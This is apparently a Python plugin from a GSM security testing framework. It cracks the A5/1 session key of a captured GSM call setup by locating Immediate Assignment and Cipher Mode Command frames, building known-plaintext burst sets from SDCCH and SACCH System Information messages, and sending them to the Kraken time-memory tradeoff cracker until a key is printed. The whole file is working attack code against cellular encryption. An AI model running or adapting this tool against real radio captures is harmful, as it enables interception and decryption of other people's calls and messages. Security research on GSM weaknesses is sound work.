# -*- coding: utf-8 -*-
import array
from itertools import cycle, dropwhile
from subprocess import check_output

import grgsm

from adapter.grgsm.cmc_analyzer import ImmediateAssignmentExtractor, CMCFinder, CMCAnalyzer, SICollector
from adapter.kraken_adapter import KrakenA51ReconstructorAdapter
from core.adapterinterfaces.a5 import A5BurstSet
from core.common import arfcn
from core.plugin.interface import plugin, PluginBase, cmd, arg, arg_exclusive, arg_group


@plugin(name='A5/1 Kraken TMTO Plugin', description='Kraken ftw')
class A51ReconstructionPlugin(PluginBase):
    attack_modes = ['SDCCH', 'SACCH', 'SDCCH/SACCH']
    channel_modes = ['BCCH', 'BCCH_SDCCH4', 'SDCCH8']

    @arg("-m", action="store", dest="mode", choices=channel_modes,
         help="Channel mode. This determines on which channels to search for messages that can be cracked.",
         default="BCCH_SDCCH4")
    @arg("--attack-mode", action="store", dest="attackmode", choices=attack_modes,
         help="Attack mode. This determines on which channels to search for messages that can be cracked.",
         default="SDCCH/SACCH")
    @arg("-t", action="store", dest="timeslot", type=int,
         help="Timeslot of the Immediate Assignment or Cipher Mode Command.", default=0)
    @arg("-v", action="store_true", dest="verbose", help="If enabled the command displays verbose information.")
    @arg_exclusive(args=[
        arg("--cfile", action="store_path", dest="cfile", help="cfile."),
        arg("--bursts", action="store_path", dest="bursts", help="bursts.")
    ])
    @arg_group(name="Cfile Options", args=[
        arg("-a", action="store", dest="arfcn", type=int, help="ARFCN of the cfile capture."),
        arg("-f", action="store", dest="freq", type=float, help="Frequency of the cfile capture."),
        arg("-b", action="store", dest="band", choices=arfcn.get_bands(), help="GSM of the cfile capture."),
        arg("-p", action="store", dest="ppm", type=int, help="Set ppm. Default: value from config file."),
        arg("-s", action="store", dest="samp_rate", type=float,
            help="Set sample rate. Default: value from config file."),
        arg("-g", action="store", type=float, dest="gain", help="Set gain. Default: value from config file.")
    ])
    @arg_exclusive(args=[
        arg("--frame-ia", action="store", dest="fnr_ia", type=int, help="Framenumber of the Immediate Assignment."),
        arg("--frame-cmc", action="store", dest="fnr_cmc", type=int, help="Framenumber of the Cipher Mode Command.")
    ])
    @cmd(name="a51_kraken", description="Reconstruct A51 session key from captured messages using Kraken TMTO.")
    def a51_kraken(self, args):
        fnr_cmc = args.fnr_cmc
        timeslot = args.timeslot
        subchannel = None
        is_cmc_provided = False
        burst_file = args.bursts
        mode = args.mode

        if args.fnr_cmc is not None:
            is_cmc_provided = True
        elif args.fnr_ia is not None:
            ia_extractor = ImmediateAssignmentExtractor(burst_file, timeslot, mode, args.fnr_ia)
            ia_extractor.start()
            ia_extractor.wait()

            error = True
            mode = "BCCH_SDCCH4"
            immediate_assignments = ia_extractor.extract_immediate_assignment.get_frame_numbers()
            for i in range(len(immediate_assignments)):
                if immediate_assignments[i] == args.fnr_ia:
                    self.printmsg("Immediate Assignment at %s" % immediate_assignments[i])
                    timeslot = ia_extractor.extract_immediate_assignment.get_timeslots()[i]
                    subchannel = ia_extractor.extract_immediate_assignment.get_subchannels()[i]
                    if ia_extractor.extract_immediate_assignment.get_channel_types()[i] == "SDCCH/8":
                        mode = "SDCCH8"
                    error = False
                    break
            if error:
                self.printmsg("No valid framenumber for immediate assignment was provided.")
                return

            cmc_finder = CMCFinder(burst_file, timeslot, subchannel, mode, args.fnr_ia)  # ToDo: channeltype from ia
            cmc_finder.start()
            cmc_finder.wait()

            fnr_cmc = cmc_finder.get_cmc()
            if fnr_cmc is None:
                self.printmsg("No cipher mode command was found.")
                return
        else:
            self.printmsg("No valid framenumber for cipher mode command or immediate assignment was provided.")
            return

        fnr_start = fnr_cmc - 2 * 102  # should be (args.fnr_cmc - 3 * 102 + max_fnr) mod max_fnr
        fnr_end = fnr_cmc + 3 * 102 + 3  # should be (args.fnr_cmc + 3 * 102 + 3) mod max_fnr

        cmc_analyzer = CMCAnalyzer(timeslot, burst_file, mode, fnr_start, fnr_end)
        cmc_analyzer.start()
        cmc_analyzer.wait()

        if not cmc_analyzer.is_a51_cmc(fnr_cmc):
            self.printmsg("Cipher Mode Command at %s does not assign A5/1" % fnr_cmc)
            return
        else:
            self.printmsg("Cipher Mode Command at %s" % fnr_cmc)

        if is_cmc_provided:
            subchannel = cmc_analyzer.get_subchannel(fnr_cmc)

        kraken_burst_sets = cmc_analyzer.createLapdmUiBurstSets(fnr_cmc)

        kraken_adapter = KrakenA51ReconstructorAdapter(self._config_provider)

        key_found = False

        if args.attackmode != "SACCH":
            sdcch_counter = 0
            for burst_set in kraken_burst_sets:
                if sdcch_counter % 4 == 0 and args.verbose:
                    self.printmsg(
                        "Using SDCCH message bursts %s - %s" % (burst_set.frame_number, burst_set.frame_number + 4))
                sdcch_counter += 1

                key = kraken_adapter.send2kraken(burst_set, args.verbose)
                if key is not None:
                    key_found = True
                    self.printmsg("Key found: %s" % key)
                    break
                else:
                    # self.printmsg("%s - no key found" % burst_set.frame_number)
                    pass

        if key_found or args.attackmode == "SDCCH":
            return

        # self.printmsg("Starting attack on SACCH")

        last_sit_fnr = -1
        last_si_type = None
        timingadvance = -1

        plaintext_si_msgs = dict()

        for sit_fnr in cmc_analyzer.sacch_sits:
            if sit_fnr > last_sit_fnr and sit_fnr < fnr_cmc:
                last_sit_fnr = sit_fnr
                # extract timing advance
                last_si_type = cmc_analyzer.sacch_sits[sit_fnr][1]
                data_string = cmc_analyzer.sacch_sits[sit_fnr][2]
                # byte_arr = array.array('B', data_string.decode("hex"))

                byte_list = self.byte_string_to_list(data_string)
                timingadvance = byte_list[1]

                # add the system information messages from the attacked sacch
                # those should have the right timing advance anyway (at least in most cases)
                if not plaintext_si_msgs.has_key(last_si_type):
                    plaintext_si_msgs[last_si_type] = byte_list

        if last_sit_fnr == -1:
            self.printmsg("Could not determine last System Information message")
            return
        # self.printmsg("Last SI message at " + str(last_sit_fnr))

        si_collector = SICollector(timeslot, burst_file, mode)
        si_collector.start()
        si_collector.wait()

        # collect all system information message types used on SACCH by the network
        for t in si_collector.si_messages:
            # there can be at most four different system information message types on SACCH.
            if len(plaintext_si_msgs) >= 4:
                break

            # if the type is not in the plaintext dictionary or has another timing advance
            # we put it in the dict
            if not plaintext_si_msgs.has_key(t) or plaintext_si_msgs[t][1] != timingadvance:
                plaintext_si_msgs[t] = self.byte_string_to_list(si_collector.si_messages[t])

        for msg in plaintext_si_msgs:
            # correct timing advance
            if plaintext_si_msgs[msg][1] != timingadvance:
                plaintext_si_msgs[msg][1] = timingadvance

        # create bursts for all system information message types
        plaintext_si_bursts = dict()
        for msg in plaintext_si_msgs:
            plaintext_si_bursts[msg] = self.message_to_bursts(plaintext_si_msgs[msg])

        sacch_si_types = ["System Information Type 5", "System Information Type 5bis", "System Information Type 5ter",
                          "System Information Type 6"]
        if not plaintext_si_msgs.has_key("System Information Type 5bis"):
            sacch_si_types.remove("System Information Type 5bis")
            if not plaintext_si_msgs.has_key("System Information Type 5ter"):
                sacch_si_types.remove("System Information Type 5ter")

        type_pool = cycle(sacch_si_types)
        dropwhile(lambda x: x != last_si_type, type_pool)
        next(type_pool)  # next one would last_si_type, which we use as starting point

        # assemble burst sets
        sacch_burst_sets = []
        for i in range(1, 4):
            type_of_msg = next(type_pool)  # expected type of next message
            fnr_of_msg = last_sit_fnr + i * 102

            bursts_of_plaintext = plaintext_si_bursts[type_of_msg]

            for j in range(0, 4):
                fnr = fnr_of_msg + j
                check_burst_index = 0 if j > 0 else 1
                sacch_burst_sets.append(
                    A5BurstSet(
                        fnr,  # framenumber of the burst we want to use
                        cmc_analyzer.bursts[fnr],  # data (payload) of the burst we want to use
                        bursts_of_plaintext[j],  # plaintext data (payload) of a lapdm ui message
                        fnr_of_msg + check_burst_index,  # framenumber of verification burst.
                        # we use the first burst of the message as check burst, if j > 0
                        cmc_analyzer.bursts[fnr_of_msg + check_burst_index],  # data (payload) of the verification burst
                        bursts_of_plaintext[check_burst_index]  # plaintextdata (payload) of
                        # the verification burst
                    )
                )

        sacch_counter = 0
        for burst_set in sacch_burst_sets:
            if sacch_counter % 4 == 0 and args.verbose:
                self.printmsg(
                    "Using SACCH message bursts %s - %s" % (burst_set.frame_number, burst_set.frame_number + 4))
                sacch_counter += 1

            key = kraken_adapter.send2kraken(burst_set, args.verbose)
            if key is not None:
                key_found = True
                self.printmsg("Key found: %s" % key)
                break
            else:
                pass
                # self.printmsg("%s - no key found" % burst_set.frame_number)

                # self.printmsg("I am done....")
                # Todo: look at a lapdm ui message: if randomized, we wont do the attempt on sdcch

    def byte_string_to_list(self, string):
        byte_arr = array.array('B', string.decode("hex"))
        return byte_arr.tolist()

    def message_to_bursts(self, message_bytes):
        result = []
        message = ""

        for byte in message_bytes:
            message += "%0.2X" % byte

        output = check_output(["gsmframecoder", message]).split("\n")
        if len(output) >= 9:
            for i in range(4):
                result.append(output[(i + 1) * 2])
        return result
